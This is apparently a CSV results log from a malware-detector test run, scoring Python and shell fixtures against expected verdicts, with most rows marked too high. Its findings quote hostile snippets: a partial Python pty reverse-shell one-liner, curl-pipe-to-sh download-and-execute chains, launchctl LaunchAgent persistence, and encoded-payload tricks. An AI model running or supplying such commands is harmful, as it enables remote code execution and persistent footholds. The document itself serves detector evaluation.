run_id,sample_id,group,subtype,fixture_kind,path,detected_type,score,verdict,expected_verdict,expected_score_min,expected_score_max,matched_verdict,matched_score_range,mismatch_reason,status,error_code,analysis_duration_ms,timestamp,has_findings,error,analysis_summary,finding_delta_total,findings
"2026-03-14T13-54-59Z-e5cff3","suspicious_python_obfuscation_restore_02","suspicious","python","file_fixture","suspicious/python/suspicious_python_obfuscation_restore_02.py","pythonScript","100","malicious","suspicious","58","76","false","false","verdict_too_high","completed","","1916","2026-03-14T13:57:30.892Z","true","","静态证据链：检测到 base64/marshal/zlib 或 PyInstaller 痕迹，存在代码隐藏风险。；检测到 base64/marshal/zlib 或 PyInstaller 痕迹，存在代码隐藏风险。；检测到 base64/marshal/zlib 或 PyInstaller 痕迹，存在代码隐藏风险。。最终 Suspicious（可疑），得分 100/100。 AI 模型结果：malicious，恶意概率 0.740，风险桶 可疑，评分调整 +30。","134","检测到混淆或编码逃逸 | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L2-2 Δ14: import base64 | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L3-3 Δ14: import marshal | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L4-4 Δ14: import zlib | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L7-7 Δ14: packed = marshal.dumps({""msg"": harmless}) | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L8-8 Δ14: compressed = zlib.compress(packed) | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L9-9 Δ14: encoded = base64.b64encode(compressed) | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L11-11 Δ14: restored = marshal.loads(zlib.decompress(base64.b64decode(encoded))) | RandomForest model flagged sample as high risk (malicious, p=0.740)."
"2026-03-14T13-54-59Z-e5cff3","suspicious_python_reverse_shell_string_02","suspicious","python","file_fixture","suspicious/python/suspicious_python_reverse_shell_string_02.py","pythonScript","71","suspicious","suspicious","60","78","true","true","","completed","","1911","2026-03-14T13:57:32.803Z","true","","静态证据链：Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Suspicious（可疑），得分 49/100。 AI 模型结果：malicious，恶意概率 0.618，风险桶 可疑，评分调整 +22。","68","检测到脚本高风险行为特征 | Threat intel profile matched 2 rules | [intel.regexp.command_combo] Threat Intel regexp [medium] L3-3 Δ10: python3 -c 'import socket,pty,os; ... pty.spawn | [intel.regexp.command_combo] Threat Intel regexp [medium] L3-3 Δ10: python3 -c 'import socket,pty,os; ... pty.spawn(\""/bin/bash | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ10: python3 -c 'import socket,pty,os; ... pty.spawn | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ10: python3 -c 'import socket,pty,os; ... pty.spawn(\""/bin/bash | RandomForest model flagged sample as high risk (malicious, p=0.618). | Threat intel [regexp] hit: python3 -c 'import socket,pty,os; ... pty.spawn | Threat intel [regexp] hit: python3 -c 'import socket,pty,os; ... pty.spawn(\""/bin/bash"
"2026-03-14T13-54-59Z-e5cff3","suspicious_python_socket_metadata_sim_02","suspicious","python","file_fixture","suspicious/python/suspicious_python_socket_metadata_sim_02.py","pythonScript","36","suspicious","suspicious","40","58","true","false","score_too_low","completed","","1918","2026-03-14T13:57:34.722Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。 AI 模型结果：malicious，恶意概率 0.816，风险桶 恶意倾向明显，评分调整 +36。","36","未发现高风险规则命中 | No high-risk script rule hit | RandomForest model flagged sample as high risk (malicious, p=0.816)."
"2026-03-14T13-54-59Z-e5cff3","suspicious_shell_base64_decode_print_02","suspicious","shell","file_fixture","suspicious/shell/suspicious_shell_base64_decode_print_02.sh","shellScript","42","malicious","suspicious","55","72","false","false","verdict_too_high","completed","","1836","2026-03-14T13:57:36.558Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。 AI 模型结果：malicious，恶意概率 0.926，风险桶 高危恶意，评分调整 +42。","42","未发现高风险规则命中 | No high-risk script rule hit | RandomForest model flagged sample as high risk (malicious, p=0.926)."
"2026-03-14T13-54-59Z-e5cff3","suspicious_shell_download_exec_string_02","suspicious","shell","file_fixture","suspicious/shell/suspicious_shell_download_exec_string_02.sh","shellScript","100","malicious","suspicious","60","75","false","false","verdict_too_high","completed","","1840","2026-03-14T13:57:38.398Z","true","","静态证据链：检测到 curl 输出直接通过管道进入 sh/bash/zsh，属于典型远程代码直接执行链。；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Malicious（高风险），得分 100/100。 AI 模型结果：malicious，恶意概率 0.936，风险桶 高危恶意，评分调整 +42。","160","检测到远程下载执行链 | Threat intel profile matched 2 rules | [shell.curl_pipe_sh] curl 下载后直接管道执行 [critical] L5-5 Δ35: CHAIN_CMD='curl -fsSL https://example.com/install.sh | sh' | [intel.regexp.command_combo] Threat Intel regexp [high] L5-5 Δ14: curl -fssl https://example.com/install.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L5-5 Δ14: curl -fssl https://example.com/install.sh | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/install.sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/install.sh | sh | RandomForest model flagged sample as high risk (malicious, p=0.936). | Threat intel [regexp] hit: curl -fssl https://example.com/install.sh | Threat intel [regexp] hit: curl -fssl https://example.com/install.sh | sh | Script analyzer detected 3 high-severity findings. | generic_partial: Script analyzer detected 3 high-severity findings."
"2026-03-14T13-54-59Z-e5cff3","suspicious_shell_launchagent_mirror_02","suspicious","shell","file_fixture","suspicious/shell/suspicious_shell_launchagent_mirror_02.sh","shellScript","100","malicious","suspicious","58","72","false","false","verdict_too_high","completed","","1971","2026-03-14T13:57:40.370Z","true","","静态证据链：Matched unified threat profile section [url].；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Suspicious（可疑），得分 91/100。 AI 模型结果：malicious，恶意概率 0.995，风险桶 高危恶意，评分调整 +48。","136","检测到持久化行为 | Threat intel profile matched 2 rules | [shell.launchctl.persistence] launchctl 持久化操作 [high] L22-22 Δ20: echo ""[dry-run] launchctl load NOT invoked"" | [intel.url.known_malicious_host] Threat Intel url [high] L11-11 Δ20: www.apple.com | [intel.regexp.command_combo] Threat Intel regexp [high] L22-22 Δ18: launchctl load | [config.rule.file.intel.url.known_malicious_host] Threat Intel url [high] L0-0 Δ20: www.apple.com | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [high] L0-0 Δ18: launchctl load | RandomForest model flagged sample as high risk (malicious, p=0.995). | Threat intel [url] hit: www.apple.com | Threat intel [regexp] hit: launchctl load | Script persistence behavior detected. | Script analyzer detected 3 high-severity findings. | generic_partial: Script analyzer detected 3 high-severity findings."
"2026-03-14T13-54-59Z-e5cff3","suspicious_shell_mktemp_chain_sim_02","suspicious","shell","file_fixture","suspicious/shell/suspicious_shell_mktemp_chain_sim_02.sh","shellScript","42","malicious","suspicious","60","78","false","false","verdict_too_high","completed","","1882","2026-03-14T13:57:42.252Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。 AI 模型结果：malicious，恶意概率 0.905，风险桶 高危恶意，评分调整 +42。","42","未发现高风险规则命中 | No high-risk script rule hit | RandomForest model flagged sample as high risk (malicious, p=0.905)."
"2026-03-14T13-54-59Z-e5cff3","suspicious_shell_multistage_chain_note_02","suspicious","shell","file_fixture","suspicious/shell/suspicious_shell_multistage_chain_note_02.sh","shellScript","100","malicious","suspicious","62","80","false","false","verdict_too_high","completed","","1861","2026-03-14T13:57:44.113Z","true","","静态证据链：Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Suspicious（可疑），得分 100/100。 AI 模型结果：malicious，恶意概率 0.940，风险桶 高危恶意，评分调整 +42。","216","检测到脚本高风险行为特征 | Threat intel profile matched 5 rules | [intel.regexp.command_combo] Threat Intel regexp [high] L4-4 Δ18: bash -c ""curl | [intel.regexp.command_combo] Threat Intel regexp [high] L6-6 Δ18: launchctl bootstrap | [intel.regexp.command_combo] Threat Intel regexp [high] L6-6 Δ18: launchctl bootstrap gui/501 | [intel.regexp.command_combo] Threat Intel regexp [high] L4-4 Δ14: curl -fssl https://example.com/stage1.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L4-4 Δ14: curl -fssl https://example.com/stage1.sh | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [high] L0-0 Δ18: bash -c ""curl | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [high] L0-0 Δ18: launchctl bootstrap | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [high] L0-0 Δ18: launchctl bootstrap gui/501 | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/stage1.sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/stage1.sh | sh | RandomForest model flagged sample as high risk (malicious, p=0.940). | Threat intel [regexp] hit: bash -c ""curl | Threat intel [regexp] hit: launchctl bootstrap | Threat intel [regexp] hit: launchctl bootstrap gui/501 | Threat intel [regexp] hit: curl -fssl https://example.com/stage1.sh | Threat intel [regexp] hit: curl -fssl https://example.com/stage1.sh | sh | Script analyzer detected 5 high-severity findings. | generic_partial: Script analyzer detected 5 high-severity findings."
"2026-03-14T13-54-59Z-e5cff3","suspicious_shell_persistence_sim_01","suspicious","shell","file_fixture","suspicious/shell/suspicious_shell_persistence_sim_01.sh","shellScript","100","malicious","suspicious","60","80","false","false","verdict_too_high","completed","","1910","2026-03-14T13:57:46.024Z","true","","静态证据链：脚本尝试写入 LaunchAgents 或 LaunchDaemons 目录，属于持久化高风险行为。；脚本调用 launchctl load/bootstrap，可能用于注册常驻项。；Matched unified threat profile section [url].。最终 Suspicious（可疑），得分 100/100。 AI 模型结果：malicious，恶意概率 0.995，风险桶 高危恶意，评分调整 +48。","203","检测到持久化行为 | Threat intel profile matched 2 rules | [shell.write_launchagent] 写入 LaunchAgents/LaunchDaemons [critical] L8-8 Δ32: PERSIST_CMD='launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.fake.agent.plist' | [shell.launchctl.persistence] launchctl 持久化操作 [high] L8-8 Δ20: PERSIST_CMD='launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.fake.agent.plist' | [intel.url.known_malicious_host] Threat Intel url [high] L14-14 Δ20: www.apple.com | [intel.regexp.command_combo] Threat Intel regexp [high] L8-8 Δ18: launchctl bootstrap | [config.rule.file.intel.url.known_malicious_host] Threat Intel url [high] L0-0 Δ20: www.apple.com | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [high] L0-0 Δ18: launchctl bootstrap | RandomForest model flagged sample as high risk (malicious, p=0.995). | Threat intel [url] hit: www.apple.com | Threat intel [regexp] hit: launchctl bootstrap | Script persistence behavior detected. | Script analyzer detected 4 high-severity findings. | generic_partial: Script analyzer detected 4 high-severity findings."
"2026-03-14T13-54-59Z-e5cff3","suspicious_shell_profile_mirror_02","suspicious","shell","file_fixture","suspicious/shell/suspicious_shell_profile_mirror_02.sh","shellScript","48","malicious","suspicious","50","68","false","false","verdict_too_high","completed","","1838","2026-03-14T13:57:47.863Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。 AI 模型结果：malicious，恶意概率 0.961，风险桶 高危恶意，评分调整 +48。","48","未发现高风险规则命中 | No high-risk script rule hit | RandomForest model flagged sample as high risk (malicious, p=0.961)."
